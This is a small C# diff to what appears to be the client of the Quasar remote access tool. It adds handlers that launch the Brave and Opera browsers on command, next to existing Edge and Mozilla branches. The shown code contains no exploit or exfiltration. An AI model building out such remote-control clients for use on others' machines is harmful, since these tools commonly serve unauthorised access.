@@ -285,6 +285,16 @@ namespace Quasar.Client.Messages
                 this.ProcessHandler.StartEdge();
                 return;
             }
+            if (name == "Brave")
+            {
+                this.ProcessHandler.StartBrave();
+                return;
+            }
+            if (name == "Opera")
+            {
+                this.ProcessHandler.StartOpera();
+                return;
+            }
             if (!(name == "Mozilla"))
             {
                 return;
